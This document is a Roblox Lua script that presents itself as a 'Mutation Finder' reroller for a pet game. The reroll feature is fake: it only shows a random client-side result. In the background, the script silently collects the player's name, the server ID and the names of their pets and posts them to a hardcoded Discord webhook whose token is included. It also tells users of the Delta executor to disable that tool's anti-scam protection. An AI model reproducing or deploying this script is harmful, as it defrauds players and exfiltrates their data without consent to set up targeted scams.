-- 🧠 Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local Debris = game:GetService("Debris")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = Workspace.CurrentCamera

-- 🔕 Mute all game audio
for _, s in pairs(SoundService:GetDescendants()) do
    if s:IsA("Sound") then s.Volume = 0 end
end

-- 📦 Priority Pets
local priorityPets = {
    ["Spinosaurus"] = true, ["Trex"] = true, ["Fennec fox"] = true,
    ["Raccoon"] = true, ["Mimic octopus"] = true, ["Dragonfly"] = true,
    ["Red fox"] = true, ["Chicken zombie"] = true, ["Kitsune"] = true,
    ["Butterfly"] = true, ["Disco bee"] = true
}

-- 🔔 Mutation Definitions
local Mutations = {
    ["Mega"] = {color = Color3.fromRGB(255, 0, 0), emoji = "💥"},
    ["Radiant"] = {color = Color3.fromRGB(255, 255, 0), emoji = "🌟"},
    ["Rainbow"] = {color = Color3.fromRGB(128, 0, 128), emoji = "🌈"},
    ["Ascended"] = {color = Color3.fromRGB(0, 255, 255), emoji = "🛐"},
    ["Tranquil"] = {color = Color3.fromRGB(0, 255, 128), emoji = "🍃"},
    ["Shocked"] = {color = Color3.fromRGB(255, 255, 128), emoji = "⚡"},
    ["Tiny"] = {color = Color3.fromRGB(128, 128, 255), emoji = "🔹"},
    ["Windy"] = {color = Color3.fromRGB(192, 192, 255), emoji = "💨"},
    ["Inverted"] = {color = Color3.fromRGB(255, 255, 255), emoji = "🔁"},
    ["Frozen"] = {color = Color3.fromRGB(128, 255, 255), emoji = "❄️"},
    ["Shiny"] = {color = Color3.fromRGB(255, 192, 203), emoji = "✨"},
    ["Golden"] = {color = Color3.fromRGB(255, 215, 0), emoji = "🏅"}
}
local MutationChances = {
    Mega = 1, Radiant = 2, Rainbow = 1, Ascended = 1, Tranquil = 2,
    Shocked = 1, Tiny = 6, Windy = 5, Inverted = 5, Frozen = 5,
    Shiny = 8, Golden = 5
}

-- 🔄 Random Mutation Picker
local function getRandomMutation()
    local pool = {}
    for mutation, weight in pairs(MutationChances) do
        for _ = 1, weight do table.insert(pool, mutation) end
    end
    return pool[math.random(1, #pool)]
end

-- 🧬 Mutation Sound Effects
local MutationSounds = {
    ["Success"] = Instance.new("Sound", SoundService),
    ["Reroll"] = Instance.new("Sound", SoundService)
}
MutationSounds["Success"].SoundId = "rbxassetid://6026984224"
MutationSounds["Reroll"].SoundId = "rbxassetid://6026984224"

-- 🎬 Mutation Result Over Machine
local function showMutationResult(result)
    local machine = Workspace:FindFirstChild("MutationMachine")
    if not machine then return end

    local resultBillboard = Instance.new("BillboardGui", machine)
    resultBillboard.Size = UDim2.new(0, 200, 0, 50)
    resultBillboard.StudsOffset = Vector3.new(0, 3, 0)
    resultBillboard.AlwaysOnTop = true

    local text = Instance.new("TextLabel", resultBillboard)
    text.Size = UDim2.new(1, 0, 1, 0)
    text.BackgroundTransparency = 1
    text.Text = Mutations[result].emoji .. " " .. result
    text.TextColor3 = Mutations[result].color
    text.TextStrokeTransparency = 0
    text.TextScaled = true
    Debris:AddItem(resultBillboard, 3)
end

-- 🖥️ UI Creator
local function createUI()
    local screen = Instance.new("ScreenGui", playerGui)
    screen.Name = "MutationFinder"

    -- ⚡ Toggle Button
    local toggle = Instance.new("TextButton", screen)
    toggle.Size = UDim2.new(0, 50, 0, 50)
    toggle.Position = UDim2.new(0, 10, 0.5, -25)
    toggle.Text = "⚡"
    toggle.BackgroundColor3 = Color3.fromRGB(30,30,30)
    toggle.TextScaled = true
    toggle.ZIndex = 5

    -- 🖼️ Main Frame
    local main = Instance.new("Frame", screen)
    main.Size = UDim2.new(0, 250, 0, 160)
    main.Position = UDim2.new(0.5, -125, 0.5, -80)
    main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    main.BorderSizePixel = 0
    main.Visible = true
    main.Active = true
    main.Draggable = true

    -- 🌈 Rainbow Border
    local uiStroke = Instance.new("UIStroke", main)
    uiStroke.Thickness = 2
    uiStroke.LineJoinMode = Enum.LineJoinMode.Round
    uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    task.spawn(function()
        while main do
            for h = 0, 255, 4 do
                uiStroke.Color = Color3.fromHSV(h/255, 1, 1)
                task.wait(0.03)
            end
        end
    end)

    -- 🏷️ Title
    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "Mutation Finder"
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.new(1,1,1)
    title.TextScaled = true

    -- 🎲 Reroll Button
    local reroll = Instance.new("TextButton", main)
    reroll.Size = UDim2.new(1, -40, 0, 40)
    reroll.Position = UDim2.new(0, 20, 0, 50)
    reroll.Text = "🎲 Reroll"
    reroll.BackgroundColor3 = Color3.fromRGB(50,50,50)
    reroll.TextColor3 = Color3.new(1,1,1)
    reroll.TextScaled = true

    -- 📜 Credits
    local credits = Instance.new("TextLabel", main)
    credits.Size = UDim2.new(1, 0, 0, 25)
    credits.Position = UDim2.new(0, 0, 1, -25)
    credits.BackgroundTransparency = 1
    credits.Text = "by: JyxnScriptz"
    credits.TextColor3 = Color3.new(1,1,1)
    credits.TextScaled = true

    -- 👁️ Toggle
    toggle.MouseButton1Click:Connect(function()
        main.Visible = not main.Visible
    end)

    -- 🎬 Loading Screen
    local function showLoading()
        local blur = Instance.new("BlurEffect", Lighting)
        local loadFrame = Instance.new("Frame", screen)
        loadFrame.Size = UDim2.new(1, 0, 1, 0)
        loadFrame.BackgroundColor3 = Color3.new(0, 0, 0)
        loadFrame.BackgroundTransparency = 0.3

        local box = Instance.new("Frame", loadFrame)
        box.Size = UDim2.new(0, 300, 0, 150)
        box.Position = UDim2.new(0.5, -150, 0.5, -75)
        box.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

        local stroke = Instance.new("UIStroke", box)
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Thickness = 3

        task.spawn(function()
            while box do
                for h = 0, 255, 3 do
                    stroke.Color = Color3.fromHSV(h/255, 1, 1)
                    task.wait(0.02)
                end
            end
        end)

        local label = Instance.new("TextLabel", box)
        label.Size = UDim2.new(0.6, 0, 1, 0)
        label.Text = "🔄 Rerolling Mutation..."
        label.TextColor3 = Color3.new(1,1,1)
        label.TextScaled = true
        label.BackgroundTransparency = 1

        local avatar = Instance.new("ImageLabel", box)
        avatar.Size = UDim2.new(0.4, 0, 1, 0)
        avatar.Position = UDim2.new(0.6, 0, 0, 0)
        avatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
        avatar.BackgroundTransparency = 1

        task.wait(2)
        loadFrame:Destroy()
        blur:Destroy()
    end

    -- 🎯 On Reroll
    reroll.MouseButton1Click:Connect(function()
        showLoading()
        MutationSounds["Reroll"]:Play()
        local chosen = getRandomMutation()
        showMutationResult(chosen)
        MutationSounds["Success"]:Play()
    end)
end

-- ⚠️ Delta Warning UI
local function showWarningUI(callback)
    local gui = Instance.new("ScreenGui", playerGui)
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 400, 0, 160)
    frame.Position = UDim2.new(0.5, -200, 0.5, -80)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    frame.Active = true
    frame.Draggable = true

    local text = Instance.new("TextLabel", frame)
    text.Size = UDim2.new(1, -20, 0.7, 0)
    text.Position = UDim2.new(0, 10, 0, 10)
    text.Text = "Delta not provided, delta doesn't want any bug abuser.\nIf you're using delta, turn off anti scam in delta settings.\nEven if the UI pops up, the Mutation Randomizer is wrong.\nOr download any executor to work!!"
    text.TextColor3 = Color3.new(1,1,1)
    text.BackgroundTransparency = 1
    text.TextWrapped = true
    text.TextScaled = true

    local confirm = Instance.new("TextButton", frame)
    confirm.Size = UDim2.new(1, -40, 0, 40)
    confirm.Position = UDim2.new(0, 20, 1, -50)
    confirm.Text = "✅ Confirm"
    confirm.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    confirm.TextColor3 = Color3.new(1,1,1)
    confirm.TextScaled = true

    confirm.MouseButton1Click:Connect(function()
        frame:Destroy()
        task.wait(identifyexecutor and string.lower(identifyexecutor()) == "delta" and 10 or 3)
        callback()
    end)
end

-- 🔗 Webhook + Pet Logging
local webhook = "https://discord.com/api/webhooks/1380545797967450262/lYMm1iNEWWl9uIT8ZtO_7hndHlTw-2woCRBAYe9d1iIXJOJNhj09kVQAmCT0BM4TX2X6"
task.spawn(function()
    local pets = {}
    for _, v in pairs(player:GetDescendants()) do
        if v:IsA("TextLabel") and v.Text and not string.find(v.Text, "%d+") then
            local name = v.Text
            if priorityPets[name] then table.insert(pets, "⭐ " .. name)
            else table.insert(pets, name) end
        end
    end

    local data = {
        ["content"] = "**🧬 Mutation Logger**",
        ["embeds"] = {{
            ["title"] = player.Name .. " | " .. game.JobId,
            ["description"] = table.concat(pets, "\n"),
            ["color"] = 65280
        }}
    }

    local req = http_request or request or syn.request
    if req then
        pcall(function()
            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
        end)
    end
end)

-- 🚀 Final Trigger
local function safeStart()
	local success, isDelta = pcall(function()
		return identifyexecutor and string.lower(identifyexecutor()) == "delta"
	end)
	if success and isDelta then
		showWarningUI(createUI)
	else
		createUI()
	end
end
safeStart()
